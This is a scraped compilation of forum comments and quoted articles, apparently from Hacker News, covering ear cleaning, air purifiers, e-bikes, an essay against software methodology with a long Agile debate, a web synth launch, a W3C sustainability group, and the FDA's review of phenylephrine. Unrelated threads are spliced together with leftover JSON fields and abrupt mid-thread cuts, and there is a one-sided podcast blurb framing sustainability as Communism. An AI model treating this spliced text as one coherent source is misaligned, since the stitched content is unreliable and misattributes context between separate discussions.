I always felt like there was wax I wasn't quite able to reach, and in trying to do so I only made things worse, often causing inflammation. The camera cost about £10 and came with a few plastic \"scraper\" tools (feel kinda gross to say it, heh). It allowed me to remove the wax, and importantly, visually confirm the results. Thinking about it now, it's been over a year since I last had to use it, so I think my ears might've reached a new \"equilibrium\" point (they are supposed to be self-cleaning, after all).

From what I understand the problem is that most devices on the market are designed to be small, which reduces the filter area and that again requires a stronger (louder & less efficient) fan. Going DIY also means no dependence on a specific brand's replacement filters. Then again that doesn't mean off-the-shelf products are bad, for a single room even quite cheap ones can do the job.

As such, I'd say that the \"response curves\" looked legit to my programmer brain, besides that the air certainly smells better. I can definitely say, however, that -- having replaced the filters three times over these four years -- the HEPA layer (the inmost) definitely got brownish. Each 3-6 month pre-filter cleaning cycle had nice gradations of dust and stuff after each cleaning, sometimes a great deal if we were slacking.

For a purely local transit modality, the fact that I can charge it at home on 120v and never have to deal with a gas station is fantastic -- and, in fact, a second bonus is that it reduces how often I need to fill up the car. I've never owned an EV, but the e-bike experience has really started to convince me that whenever we get a new car, it will be electric for convenience alone. I hate the \"ah crap, low on gas, can I play chicken with future-me or my wife about filling it up?\" dance. The cargo part of the bike is pretty cool, though. I've seen some people do some cool loading hacks with a scooter, but the amount of stuff you can haul on a cargo bike is really fun.

For trips up to a couple miles, biking is faster than driving, and I never have to worry about parking. Ergo stuff. A kinesis keyboard, a logitech ergo mouse, a standing desk and mat. Between these, I've probably headed off carpal tunnel and back problems by years. reply oregoncurtis 21 hours agoparentI'm in Portland and I say that anyone that lives on the Eastside within 82nd and works within those bounds should just get a bike, it's sooo much faster to get around the city. We have infamously small city blocks so all those intersections make driving a car very slow through the city and for good reason as it's safer. If you hop on a bike and take a greenway that has all the stop signs facing perpendicular traffic you can zoom around the city no problem. It's the exact same amount of time (from door to desk) for me to drive to work as it is to bike to work (including the shower). It's just shy of 7 miles.

    "originBody": "Methodology is bullshit: principles for product velocity Building the right thing shouldn't take very long -- doing away with nonsense makes product development really fast\" Ned O'Leary X GitHub Cofounder and CEO, SSOReady We’ve begun preparations for a major product launch. For us, it’s a big deal; it’s exciting. It’s a really big commitment. It’s also the kind of thing that threatens to become a quagmire, a set of features perpetually in-development. We’ve found that making the right thing – something people want – is intrinsically quite fast. By contrast, it’s all the other stuff that slows down product teams. It’s process, it’s distance between deciders and doers, it’s bloated specifications. With this in mind, I’ve realized that our company has developed – largely by accident – some general principles for achieving product velocity. Some of these may be wrong, and we’ll likely change our perspectives over time, but I thought I’d share them here nonetheless. Principles for product velocity We should probably do less All else being equal, there’s usually a trade-off between speed and quality. For the most part, doing something faster usually requires a bit of compromise. There’s a corner getting cut somewhere. But all else need not be equal. We can often eliminate requirements … and just do less stuff. With sufficiently limited scope, it’s usually feasible to build something quickly and to a high standard of quality. Most companies assign requirements, assert a deadline, and treat quality as an output. We tend to do the opposite. Given a standard of quality, what can we ship in 60 days? Recent escapades notwithstanding, Elon Musk has a similar thought process here. Before anything else, an engineer should make the requirements less dumb. Idiot mode usually works We’re big fans of the midwit meme. Put simply, the midwit meme usually shows an idiot and a genius agreeing on a simple solution, while a person of average intelligence flails around complaining about complicated stuff. Early in our company’s history, we challenged ourselves to operate in idiot mode as often as possible. When we’ve made mistakes, we’ve usually been overthinking things. We often arrive at a workable solution by asking ourselves, how would I do this if I were an idiot. Some problems aren’t important A small number of problems matter a lot. For example, we have to take security extremely seriously. It’s really not okay for us to cut corners there. But we can choose to ignore certain other things. For example, we know that our front-end doesn’t look very good on mobile devices. For the foreseeable future, we’ll just need our customers not to use mobile devices. We’d obviously like for our software to look great everywhere, but we’re choosing not to spend time on our mobile layout. No one really seems to mind. I’ll be damned if we ship dark mode any time soon. Just make the thing We don’t have a process for product development. We don’t do Figma mocks. We don’t write PRDs. We don’t really have a design system. We don’t do agile. We don’t have OKRs. We don’t even have a firm product roadmap. We don’t have any A/B testing or growth hacks. Our customers are engineers, so we generally expect that our engineers can handle product, design, and all the rest. We don’t need to have a whole committee weighing in. We just make things and see whether people like them. Rewrites need to happen sometimes Companies often think they’ll move faster if they defer technical debt as long as possible. That’s sometimes fine, but we’re comfortable doing major rewrites when appropriate. Sometimes the fastest path to building the right thing looks like this: Build the wrong thing Realize it’s the wrong thing Replace the wrong thing with the right thing If it seems reasonably useful to eliminate technical debt, we’ll do it. Pay vendors to do it When possible, we buy solutions from vendors instead of building things in-house. For example, we use a vendor called Fern to generate our SDKs. They do a pretty good job. Of course, using a vendor has significant upfront costs – these things are usually pretty expensive. It also restricts our freedom a bit. But using a vendor is typically the right move. We have very limited engineering resources, and our engineering resources are really expensive. A week of a single engineer’s time costs about $5,000 in cash. It’s worth vastly more than that when we factor in opportunity costs (i.e. how much better off we’d be if we spent that engineer’s time on something else). Relatively few things are actually worth building. Don’t hire people We don’t expect that adding headcount would increase our team’s output. Hiring is slow and hard. Onboarding and people management consume time. Even for a ramped hire, collaboration’s expensive. It’s especially hard to bring on strong people, the kind of people that can contribute without a lot of support. So although we have the resources to build a large engineering team, we do everything possible to stay small. It just makes life a lot easier. Closing thoughts To an extent that wasn’t obvious to us before, we’ve realized that product development shouldn’t take very long. If you know what your customers need, have a strong team, and avoid distracting nonsense, velocity is pretty close to inevitable.",

The point being made is \"methodology is bullshit,\" yet what is proposed is exactly that: a new methodology. \"Fix a 60-day timeframe and do whatever fits\" is a method. The truth is, everyone needs to be organized somehow, and this is why we invent methodologies, frameworks, processes - call it whatever you want - but we all need some form of organization. The problem is that some methodologies (Scrum, etc.) are heavily abused and transformed into management frameworks, which is the opposite of why they were created in the first place. But do you know how Agile was invented? It was a group of software developers, tired of heavy management processes, who came together to decide how to make their processes lightweight. Less is more. Just as one example: > \"We don’t do Figma mocks. We don’t write PRDs. We don’t really have a design system. We don’t do agile.\". Well, right from the Agile manifesto: > \"Working software over pointless documentation.\" So it sounds like we've come full circle. That's really a pity. I wonder how we can break the cycle. I also think we should take a look at the original ideas in the old-school methodologies (Agile, etc.) because they’re not bad, just abused. They were created 20 years ago by people who were in the same situation we are in now, so there's a lot of wisdom there that shouldn't be outright rejected. reply mooreds 5 hours agoparentI think there's some truth that process slows down development. (Full disclosure, I work for a company in the same space as these folks.) I love a provocative essay as much as the next person. But the authors are in a relatively new, smaller company focusing on devtools[0]. This has a couple of ramifications related to process need: - they are the customer to a great extent, so they don't need to involve external customers to discover what is needed. - they are fast followers (an OSS WorkOS competitor[1]), so can rely on product need discovery from other competitors. That's not a bad thing (I've done the same!), but it isn't sustainable forever. - they have a small team, which means everyone has autonomy and knowledge. - at the size of 2, they don't have other departments with schedules and deadlines and goals. Process is critical to getting input and coordinating across departments to achieve company goals. All of these factors mean process is an impediment without any benefit. Not every company is like this company. Not every dev team is like this dev team. My opinion is that this company in three years won't be like this company is now. I'd wager that in 3 years, if ssoready is successful, there'll be process. It'll be an impediment but a necessary one, as the attributes they currently have won't be enough to keep delivering.

I remember projects where we would discover every 3 weeks, during a Jour Fixe, that the pieces we built did not fit together. The Daily was fantastic because it was lightweight and short, but very frequent, so that communication flowed freely. The Retro was the catch-all meeting to bring up stuff (People forgot just how big the obstacles were back then - I remember having to wait 12 weeks for a config change that allowed my app to connect to the database). Recognising that one person who always tried to bring everyone together, calling them a Scrum Master and making room for them to do these tasks was a no-brainer. The top-down recognition was useful - not only did projects go noticeably better, managers could also boast that they, too, are now doing this new Agile thing! And they didn't even need to do something! That was all before Scrum of Scrums, SAFe, LeSS, you name it. As you said, we've come full circle in many aspects. It's ironic. reply pdimitar 8 hours agorootparentSorry for a bit of a blunt comment following -- but your rose-tinted view of even the original Agile / Scrum ticked me off. I have to push back here, severely so. > The Daily was fantastic because it was lightweight and short, but very frequent, so that communication flowed freely. You should qualify your statements with \"for me\" and \"for our project\" because dailies have not been a net positive over my 23 years long career. Yes, not even once. I can't remember a single time I enjoyed them, nor a single time they ever helped me with anything at all related to work. I am not introverted, nor autistic (though I very likely have ADHD). I am quite outgoing in fact, yet I will hate the dailies until my grave. The only thing they achieved was put some juniors back on track because when they get blocked they also close up and don't talk to anyone (for whatever reasons that I'll never understand apparently), and give excuse to introverted people to open up a little and have some casual chat. I am not against the latter but I dislike work meetings being hijacked and turned into half therapy sessions. I've suggested to them to do periodic screen-share pair-developing sessions, they did it, they absolutely loved it and kept doing it even after I left, and us who didn't want to do casual chats in supposed work meetings enjoyed the work meetings slightly more. Everybody won. > The Retro was the catch-all meeting to bring up stuff (People forgot just how big the obstacles were back then - I remember having to wait 12 weeks for a config change that allowed my app to connect to the database). And again, please add \"for me\" and \"for our project\". Retrospectives have been used in my career, without failure, without a single exception, to slap developers into rushing even more. That's what all managers I was ever under viewed them as: an opportunity to \"correct velocity\". Masters whipping up the slaves because they don't pick cotton quick enough. Try and sugarcoat it as much as you like -- it's that and it was always that, and the people in power will always try to swing everything in that direction. It's who they are. It's what they are. > Recognising that one person who always tried to bring everyone together, calling them a Scrum Master and making room for them to do these tasks was a no-brainer. Really cute, until you had my life and career and saw the \"scrum masters\" being one of the managers cousins who saw an opportunity to give them income while pretending they are useful. In my defense, I never witnessed a managerial system that helped me, so bear with me here. > \"We're all adults here, we don't need these rules\" was a wide spread sentiment, yet work was horribly inefficient. And for the third time: maybe in your teams. I worked in no less than 6 teams that did this very, very well. To the point of us not needing a manager because I and one other guy (we were 7 in total) basically said \"OK, things A / B / C are more or less done but we still need X and Y; me and Joel are busy with infra stuff, anybody wants to pick those up?\" and somebody always stepped up. Is that what a scrum master is supposed to be doing? I've never seen it though. But we managed to distribute load and responsibility between ourselves pretty well. Predictably, that team was eventually disbanded because we had actual power during the executive meetings (me and the other guy attended them). Nobody likes programmers who can push back in an informed manner that ruins the CEO's prepared graphs and slides. Who wants their beautiful illusions shattered by facts? Not these \"adults\" for sure. And yes all of us left shortly after. And yes 3 out of the 7 of us were called back some months later to fix the messes of the others. We beat the code back into shape in less than a month, charged them triple and laughed our way to the bank. --- Bigger point is: we all know the beautiful theory. But there are people out there who don't like it and want to skew the practices to what serves their interests, not yours and not mine. Glad that you had such a positive experience. Really. But you should be more objective and remind yourself that you are very likely privileged. Most of us are not. reply pflenker 7 hours agorootparentSorry for not having made this clearer, I assumed it was obvious that I was sharing my own experiences, which is why I didn't prepend \"..for me\" or \"..in my experience\" anywhere. Reading through my post I do think it's sufficiently obvious, as I am specifically mentioning how I remember certain projects. Looking through your counterpoints I think I need to emphasise my opening sentence a bit more strongly: It was fantastic _when it was introduced bottom-up_. This is important, because the ceremonies were all engineering-driven and managers usually not present. So there was no rushing and \"whipping\" during the retros, there was no scrum master being the manager and everyone wanted to be done with the daily quickly, and so on. > Really. But you should be more objective and remind yourself that you are very likely privileged. Most of us are not.

IOW they're trying to do their jobs (manage employees) but engineering is a high trust profession and some managers just don't have the trust (not to say that all engineers have the integrity...) reply hinkley 2 hours agorootparentThat’s because Scrum is so easy to turn into a management process.

This is what people fail time and time again to understand. I think most commenters on HN understand this. But then what problem does capital-A Agile solve? It was meant to surface problems faster and empower people in teams, and benefit the customer, avoiding waste and nasty surprises. Yet we've seen enough horror stories in these past decades to understand Agile (Scrum et al) can fail just just as often and is as prone to mismanagement and meddling as the methods it was meant to replace. It takes a strong team (leadership and stakeholders included) to make Agile work and reap its benefits. But such a strong team will probably work well with whatever methodology -- strong teams are effective regardless. What about average teams, which Agile was supposed to be helping? In my experience, they'll fail just as often. A method that works for a team of focused superheroes is not really applicable to the general population of developers. reply zimzam 5 hours agorootparentCapital-A Agile is for companies that want the benefits of agile (higher velocity) but don’t want to trust their employees or make any meaningful changes in how the management team operates (micromanagement, committing to rigid feature scopes on rigid schedules). Obviously this doesn’t increase work but companies get to say they are “agile” and the management team gets to keep doing all the counterproductive management they were doing before. No hard conversations about changing how management operates or unpredictable things like giving engineers autonomy. reply seadan83 7 minutes agorootparentAgile is not there for higher velocity! It is sold to management that way often, but intrinsically - no. Agile though is meant to reduce waste. In other words, you don't march faster, but are supposed to spend more time marching in the right direction. (I personally loathe agile and find it intrinsically broken.. I just find it kind of funny that a process oriented around dynamic environments is supposed to give predictability and speed, when it gives neither. If anything, a lack of predictability since direction can change) reply mwigdahl 4 hours agorootparentprevThis sounds cynical on its face but it is my experience as well. Management does not actually trust engineers to provide value without close oversight (sometimes with good reason!), so any framework that purports to give engineers more autonomy will eventually be subverted by the management. And since management always has more power than line engineering, they always win. The only way for \"true\" agile to really take root would be for management to trust engineering to add more value on their own than when being micromanaged. That's a tall order, and gets much taller in larger organizations. reply sevensor 5 hours agoparentprevAgile, in practice, has turned into \"disorganized waterfall.\" Witness absurdities like the existence of the \"Agile Gantt Chart for Jira.\" The reason Waterfall, or modern Agile, are the way they are, is that they are systems that allows the smallest possible number of people to take responsibility, while allowing everyone to perform accountability. Basically nobody wants to lay it on the line and say to the CTO, \"I'm going to make this project succeed.\" Much easier to say, \"we're using best practices and modern processes.\" This is a consequence of failing to train managers, especially in the moral dimension of management, which is entirely about accepting responsibility, and of promoting into management individuals who are not prepared to do so. reply ebiester 4 hours agorootparentIt turns out for large cross-team initiatives, organizing the work is as hard as doing it. I like the example of internationalization. You need involvement from all parts of the product to release it - you rarely can sell a half-internationalized product. You need to work with external teams of translators who need to be fed the work in a consistent interface. There will be pieces of the work that nobody is going to forsee (e.g. pulling text from the database) that will be surfaced and handled consistently. So, to get it out, you need to have each team prioritize the work. You effectively need a deadline, or the work will never happen. (The work is valuable for the company, but does not drive any individual team's customers.) You will have dependencies: Team A has to address part of the work before team B can. And you need a way for teams to report that they are done so that it can be reviewed for consistency across the product. This is a bad fit for most agile methodologies, but you're not going to take everyone out of it temporarily and then go back in. So you have to accommodate a project within your system. But these exceptions become more and more common as your company gets bigger and bigger. The only truth that I can find is that the only way to stay agile is to stay small: small teams naturally do the things that are agile. reply GuB-42 3 hours agoparentprev> Well, right from the Agile manifesto The Agile manifesto is great. It is simple, straightforward, and most importantly, it clearly defines itself as a statement of opinion, with a counterpart to each of its value. And yet so many people do exactly what the manifesto tells them not do to. Why? Just why? It is as if a clothing brand has \"beach and sun over mountain and snow\" as its value and people go to ski with them and complain that they get cold. Agile is not on size fits all, sometimes you need comprehensive documentation for instance. In this case, just don't do Agile, the manifesto is really explicit in that it is not the right methodology for you.

That usually means a heterogeneous mix of skilled, smart, experienced, and creative people that work well as a team, and teams like that, don’t come easily. People (and teams) are really important, and I believe it’s a mistake to think of them as some kind of interchangeable modules (as is the norm in the tech industry, these days). So good management is critical. Keeping staff for long periods of time is also critical. If you have a lot of turnover, you need process to regulate the churn. Long-term employees don’t need to be told what to do, in triplicate, every day. They Just Know, and that “tribal knowledge” is the real key. Also, people that have worked together for a long time have significantly reduced communication overhead. A lot of stuff doesn’t need to be said or written down. This goes double, when working at scale. All that said, I used to work for a corporation that treated Process as a religion. They make really, really good stuff (at scale), but the overhead can be unbearable. They still make good stuff, though, and I haven’t seen anything close, come from less process-driven outfits.

Separating toolings (including all of the methodologies) from the ways and the culture of how a team works will be more beneficial to the team and, hence, benefit the company. reply rtpg 10 hours agoprevRE \"small problems\": I would be very curious to know what the top 3 principles are for this team. What are the three things that _never_ fall into small problems? Security was mentioned, but what else is their non negotiable? To be honest I have a hard time squaring \"security is important\" with \"we write idiot mode code all the time\" and \"we don't write design docs\". I do believe some people can just naturally, from the ether, pull out things that are designed \"correctly\" from the outset. But my impression is that if you're caring about security, then you need to have some established patterns for how to deal with stuff. Not talking about SOLID so much as just, on an API design level, having things that are hard to mis-use and the like. And seems hard to land on that without some levels of discussion. But maybe the small team is actually micro-iterating at such a level that this does not matter! reply exitb 10 hours agoparent\"No silver bullet\" usually holds true. The same methodology might make an inexperienced team productive AND be an impediment for an experienced one. reply xiphias2 9 hours agoprevI love The Rise of Worse is better, and this sounds just like that: https://www.dreamsongs.com/RiseOfWorseIsBetter.html It doesn't explain _why_ simple implementation is more important than having a simple interface, but it just makes an observation that simple implementation usually wins. In my experiments simple implementation won for velocity, because quite often I need to change small parts in all the implementation no matter how modular / reusable code I'm trying to write. As my velocity increases testing becomes more important as well (especially integration testing), as there are more features interacting in a small amount of code. reply Quimoniz 8 hours agoparentThis really hinges on 'velocity': > .. simple implementation won for velocity .. How do you specifically define velocity in this context? (I am asking because I tend to favor speedy velocity in quick iterations; which is another story, than say velocity for change...)

I guess you never did one of those \"we brought large-software-X, and are in 2/3 of the way to implement it; we just need you to plug you in-house software-Y to it\" projects, where you end up reimplementing every single feature from X into Y and make people give-up on the brought software before the vendor finishes installing it or allows you to see the documentation on how to plug anything into it.

The golden rule I've come to realise is that people don't like what they don't understand. It's made very clear this person doesn't like methodologies. I don't get the use of midwit meme here. Either you're implying that you're preaching the the choir, in which case it's just an echo chamber, or you're calling your audience idiots. Neither outcome is great. There's always a balance.

We tend to go to the other side of the pendulum when something disgusts us but there's no single company without it's own methodology. Even the most \"we're code punks\" expect their team to work in some specific way. \"Extremes are bullshit\". And some articles nonsense. reply PaulRobinson 6 hours agoprev> Given a standard of quality, what can we ship in 60 days? Others have said it, this is a methodology, and quite an aggressive one that causes a lot of questions to be asked, and if you don't, you'll end up in a mess. It requires planning, discussion, size estimation, design, maybe even prioritization (if you have two things that each take 45 days, one needs cutting and a 15 day one needs picking up, or you need to cut the scope down to 30 days each, and so on). I get it, people are bored of being managed to an inch of their lives, but I'm going to be contrarian here: We need to grow up as an industry a bit on this one. If you walk onto a construction site, you will see methodologies. The methods you see will not be the same ones as you might have used to build a lego house, or even a sandcastle on a beach. There will be Gaant charts, and project managers, and discussions, and plans, and estimates, and meetings. They do all that, because they don't want the building to fall down. These methods give us some assurances that the right things are happening in the right order and at the end, the building will function as designed and not kill anyone. When you walk into Airbus (let's leave Boeing to one side on this one), they aren't sat around making paper planes or models like they did when they were kids. They're not throwing designs together as they feel like it: there are methods, projects, and people to co-ordinate them. They do this because they want to be sure that the aircraft they build do not fall apart, even in marginal conditions they could have accounted for. Yet, for some reason, perhaps because its an industry where people first get involved in coding as a hobby, or for personal fulfillment, or some other personal reason, we seem to reject all this. We all want to be left alone, artisans in our attics, cutting the code we want to cut, for the features we think are needed, the way we want to build them, because we're special, and managers \"don't understand\". Perhaps even worse, many people really learn the fundamentals of the industry from academic applied mathematicians, who think the work is thinking alone in an office, writing a paper and occasionally teaching people - this isn't how software is built in industry. We have much to learn from professors of computer science, but we should not model our work behavior on their work behavior. The software we build can really hurt people. We owe it to others that we actually engineer it, not just hack it. Our software can easily do a bad enough job that the company - or customers' companies - fail and people lose their jobs. In some cases, failing to ship on time, or to a good enough quality might lead to even bigger consequences, up to and including death. There is an entire subsection of the industry pointing out the security risks created by software badly designed and badly built, due to a lack of engineering talent and appropriate oversight. We should all want to fix that, and I don't believe letting engineers sit in corner ignoring basic engineering best practices is going to be a successful path to that outcome. We need to be more like the construction sites, the aircraft builders, the ship yards submarines get built in, the real grown-up engineering disciplines. We need to come down from our little pillars and talk to people about what needs doing, and by when, and then have adult conversations about constraints and risks. Nobody wants everyone in meetings all day. Perhaps those conversations are weighted more heavily towards more senior engineers, which is what happens in most industries outside of software. Nobody wants to be micro-managed, but at the same time it is reasonable for the people paying you many multiples of the national median salary to ask you what it is you're doing right now, if you're blocked, and what you plan to work on next - and make suggestions about changing that plan if the company paying you needs you to change that plan. I agree that the agile certifications need to go - or radically change - and that engineers need to be trusted more, but trust is earned. The constant push back on anything that looks like reasonable organization to any other industry or to any manager, makes the industry as a whole - and those who shout the most about the pain of it all - lose trust in the eyes of the people who we need to invest in it. We just need to grow up, stop pretending that what worked when we were making sandcastles works for employers, and look to successful engineering disciplines away from software and learn from them. reply sirwhinesalot 5 hours agoparentBut most software out there is built with heavy processes? SAFe and all that nonsense, and everyone agrees the output is complete garbage. The software that is lauded and praised tends to be made by small teams of highly skilled engineers, stuff like EmberGen. To me what this says is that software is not, at all, like other engineering disciplines. Software developers aren't like masons, we're not just mixing cement, there's more to it than that. You can add more masons to a construction work and it will most likely go faster. Add more devs to a project and most likely it'll go slower. reply wg0 6 hours agoprev\"Word\" reply duke360 8 hours agoprev [–] at least part of it smells like bullshits reply Consider applying for YC's W25 batch!

Out of my love for synthesizers and web development, I created a free audio sequencer called draw.audio, which includes selectable scales, waveforms, effects, LFOs, and more. While there are other “tone matrix” style webapps out there, I couldn’t find one that quite scratched the itch for a large grid layout, modern design, and easily accessible modulation controls. So that was the inspiration, alongside my addiction to synths and hardware jam-boxes like the Synthstrom Deluge. Draw.audio uses the Web Audio API without any other frameworks or libraries. I tried to keep it as lightweight as possible. The to-do list includes a tutorial, pattern preset browsing, more audio effects, light visual animations, and open-sourcing it. In case you'd like tips: • It’s more fun on touch screens, like an iPad. • It's kid friendly! In my limited testing, kids enjoy drawing on it. • The share button generates a direct link to anything you create. A big thank you to Sheer Havoc for creating the logo and other graphics!

    "originBody": "Sustainable Web Interest Group is Formed Part of Sustainability Author(s) and publish date By: Tzviya Siegman Published: 4 November 2024 Notes W3C is pleased to announce the formation of the Sustainable Web Interest Group. The mission of the Sustainable Web Interest Group is to improve digital sustainability so that the Web works better for all people and the planet. The digital industry is responsible for 2-5% of global emissions, more than the aviation industry. If the Internet were a country it would be one of the top five polluters. The amount of water, energy, and minerals required increases annually, often putting the burden on developing economies. The Sustainable Web IG will publish the Web Sustainability Guidelines (WSG). This set of guidelines and associated materials were drafted by the Sustainable Web Design Community Group. The WSG explains how to design and implement digital products and services that put people and the planet first. The guidelines are best practices based on measurable, evidence-based research; aimed at end-users, web workers, stakeholders, tool authors, educators, and policymakers. They are in line with the Sustainable Web Manifesto and aligned with GRI Standards and the UN Sustainable Development Goals to help organizations incorporate digital products and services into broader sustainability reporting initiatives. These guidelines will enable people to better understand the Internet’s impact on sustainability reporting. This includes emissions as well as stewardship principles. In addition to publishing the guidelines, the IG plans to liaise with regulatory bodies to improve compliance targets. The membership of the community group from which this IG grew has excellent relationships with many organizations that will enable open discussions. The Sustainable Web IG will be chaired by Tim Frick of MightyBytes, Ines Akrap, an Invited Expert from StoryBlok, and Mike Gifford, an Invited Expert who works for Civic Actions. Alexander Dawson will continue as editor. I, Tzviya Siegman, will be Team Contact of the group. The group will work to improve measurability, which will enable more accurate information about sustainability and create more educational materials to enable implementations of the Web Sustainability Guidelines. We look forward to enabling a more sustainable Web and hope you will join us.",

All that's needed to drastically decrease energy use is to just take late-90s/early 2000s web technology and push it to its limits. Zero JS unless absolutely necessary. Two days ago I was watching the election results on various sites, along with many others. Some sites just didn't work in a slightly older browser, and those which did were still consuming a lot more resources than they really needed. It shouldn't require the latest in web technologies and computing hardware to show a simple dynamically updating outline map. reply n_ary 38 minutes agoparentThe fact that you entirely ignore the biggest plague of the web, i.e. ads and analytics and all taboola garbage and autoplaying videos and audios, taking more energy than that once a year election pie chart makes me think that you are missing the forest for the tree. Also, even if I were to try picking up React today and make a most garbage pie chart on a page visited by whole population of America, it would still be dwarfed by the amount of energy wasted by watching a tiktok video on same number of devices. reply graypegg 1 hour agoparentprevJust to play devils advocate for a minute: I live in Montréal Québec Canada, and the power entering my home is almost certainly generated at a hydroelectric dam. [0] There is an ecological impact from damming rivers, but in terms of GHG emissions, it's drastically better environmentally compared to coal or natural gas electricity generation systems. If the service I'm using is hosted on us-east-1, it's using power from virginia, which uses a mix of natural gas and nuclear.

Yes, it doesn't have to be that time frame, but it would be a good reference point. Early 2000s allowed us to do most of what we can now, there are certainly exceptions, but the average website would be no worse. The savings in processing and memory consumption can then either be used to run other things, or extend the usable lifetime of a device. There's no reason why we could not use the same device for 10 or more years, again with some specialised exceptions. Give that this is specifically a w3.org SIG, I'd suggest doing a LTS web standard, something like 10 - 15 years. Make it have a reduced feature set in terms of Javascript and CSS. For some businesses it would be attractive to know that a solution developed to a specific standard which would mean compatibility across devices and software for 10 years (ideally more, 10 years isn't that long). Newer devices would consume less power and older devices would require less frequent replacement. The problem is that this would need to find it's way into a browser, which would also need a long term supported and stable operating system, to gain all the benefits. reply karmarepellent 12 hours agoparentprevNot sure why JS is the problem though. You can use JS in small doses to drastically improve the user experience on websites. The fact that heavy frameworks are sometimes used in contexts where they are overkill is not strictly JS' fault. By that logic you would also need to go down the rabbit hole of what compilers produce efficient programs on the server side and ban everything else. I think the tools we have nowadays are perfectly fine. It's a matter of how they are used. And I am pretty sure efficiency is not what companies think of when they launch a product. reply michaelt 8 hours agorootparentLanguages, language tools, language communities and language reputations are kinda inseparable. You can write Java without using incredibly huge class, function, and variable names. You don't have to apply complex design patterns everywhere, or use a complicated framework you barely understand. You don't have to write code that produces 50-line stack traces. I don't have to import a dozen dependencies each with a dozen dependencies of their own, creating an endless security update treadmill. You don't have to write code that needs a gigabyte of RAM for the smallest microservice. Problems like long garbage collection pauses can be solved. But if I take a job writing Java software? Probably I'm going to be handed a codebase written the way most Java developers write Java code. And I'd better make peace with that, or find a different job. reply karmarepellent 7 hours agorootparentI agree. Sometimes the best you can do to cope with the sprawling ecosystems around programming languages and having to deal with convoluted codebases and inefficient programs, is sit down at home and building something simple (if you can spare the time and energy). That is what I do every now and then and it is incredibly satisfying to be able to explore how therapeutic programming can be when you are not boxed in. I think this is not how companies work though, because they do not operate based on your views alone. And getting all people to agree on some of the topics you mentioned (e.g. importing dependencies vs. rolling your own implementations) is an incredibly complex task. reply zekrioca 14 hours agoparentprevOne should not confuse energy-efficiency with sustainability. Yes, pushing simpler frameworks to its limits is good, but it is not the main issue, nor it is enough given the exponential growth in demand that we have been witnessing. reply endorphine 2 hours agorootparentCan you expand on that? What's the main issue? reply jacoblambda 15 hours agoparentprevIs there a reason why there seemingly aren't any frameworks to do all the fancy web flourish in a normal language and then have it compile down to plain HTML5 + CSS + SVG? reply vbezhenar 10 hours agorootparentYou can compile almost any language to JS or WASM. As to HTML + CSS: it goes other way around: HTML and CSS (or rather its subsets) are being integrated into \"normal languages\", like Qt, Java. I'm not sure I ever saw any technology that could serve as a replacement for HTML + CSS. May be Eclipse RAP or Blazor? But they are so heavy that React will look like a butterfly and they're not aiming to replace HTML/CSS but rather just use it as output medium for their UI. reply jacoblambda 4 hours agorootparent> As to HTML + CSS: it goes other way around... Yeah that kind of stuff is closer but most of those types of frameworks seem to lean heavily on mapping to JS because they try to be turing complete rather than just being easy to work with DSLs. reply fuzzy2 9 hours agorootparentprevSounds like you might be looking for a Static Site Generator. Astro was already mentioned. There's plenty of others, mostly geared towards blogs. I also had success with docfx and MkDocs, both for project documentation. reply jacoblambda 5 hours agorootparentYep. I'm well versed with static site generators but every one I've ever worked with has been heavily template based rather than being an actual layout engine that map onto HTML+CSS+SVG. i.e. They all require you to still write in HTML+CSS+SVG rather than being a generalised way of writing HTML+CSS+SVG without dealing with the warts of those languages. reply fuzzy2 1 hour agorootparentI don't entirely get what you mean by \"layout engine\". A WYSIWYG editor perhaps? Or maybe a canvas like Microsoft OneNote, where you can draw and put text boxes? Or a word processor? Why isn't the usual Markdown (or the like) approach enough?

Also, as far as I know, Facebook has its own h/w ambitions. It builds its own h/w and equips its own datacenters with it.

Recently I was trying to inspect Twitter/X to obtain a video. You would not believe how many nested 'div' elements it was buried under. I also had to do a X icon to replace the Twitter bird. So I went to get the official one and make it into my lean SVG. Again, you would not believe how much bloat was in what should have been a very simple file. This is no rant about Twitter, the web in general is 99% bloat. I don't believe Google have 'stewarded' the web well enough to keep it lean. If we go with the icon example, an icon has to be simple or else it is not an icon. Yet we have huge icon sets as fonts with excessive bloat. This is why I end up having to hand-carve SVG assets on the regular. This aspect of simplicity applies to web pages too. Style sheets should not be thousands of lines. Content does not need to be nested in a billion divs, particularly since no div elements are needed now we have content sectioning elements and CSS grid layout. The leanness of a website should be important as an expression of brand values for companies. For example, if your business is making cars, your website should be the fastest loading one to reflect your 0-60 times. Hopefully we will get metrics for efficiency as one of things like accessibility that people strive for in varying degrees, with this efficiency being good for SEO. As it is, Google prefer data to be poorly structured as wading through rubbish is what their business depends on. If all content was well organised without the bloat then others would be able to do search to compete with Google.

Sustainability is going to be the buzzword of the century. Everywhere we turn, we hear about sustainable practices in business and industry, sustainable foods and agriculture, sustainable energy, and so on. Businesses and governments sign on to “Sustainable Development Goals,” and so civil responsibility is framed in terms of this seemingly simple idea: sustainability. What does sustainability entail, though? What informs it? In this episode of the New Discourses Podcast, James Lindsay walks through Herbert Marcuse’s New Leftism of the 1960s and 1970s and explains how sustainability has become Marcuse’s “New Sensibility.” In other words, sustainability is the new way of thinking about the world so that we can have liberation, which is to say Communism.

    "commentBody": "FDA proposes ending use of oral phenylephrine as OTC nasal decongestant (fda.gov)181 points by impish9208 18 hours agohidepastfavorite348 comments schoen 13 hours agoContext for readers from countries where this isn't an issue, or anyone who hasn't followed decongestant news: one of the most effective decongestants is called pseudoephedrine. https://en.wikipedia.org/wiki/Pseudoephedrine In the past this was easily available, with the most popular brand being Sudafed. My parents always told me that one should take Sudafed when flying after having had a cold, in order to avoid severe ear pain from the pressure changes, but people would also obviously take it when not flying, just in order to reduce the discomfort of the congestion itself. Pseudoephedrine is very effective. It is also used to synthesize the somewhat related illegal drug methamphetamine (\"meth\"). Historically, meth manufacturers would hire people to buy large amounts of pseudoephedrine pills at pharmacies and supermarkets, then grind them up and synthesize meth from them. In order to deter this, authorities in the U.S. restricted the availability of pseudoephedrine, while not making it prescription-only, by limiting the amount that people could buy, and requiring buyers to show ID and be put on a registry (which law enforcement could use in investigations). I think this is the only drug that is treated this way. Some people stopped buying pseudoephedrine entirely, either because they were offended by these rules or because they were afraid that they could wrongly be implicated in meth investigations if they appeared to buy it too often. The pharmaceutical industry produced an alternative called phenylephrine, the substance that this proceeding relates to. Most manufacturers of pseudoephedrine-based drugs, including Sudafed, formulated alternative decongestants using phenylephrine. There are no legal restrictions on phenylephrine drugs; one can buy them anonymously and in any quantity. Customers have complained for years that these are much less effective than the original formulations. A couple of years ago this regulatory authority started looking into the question of whether 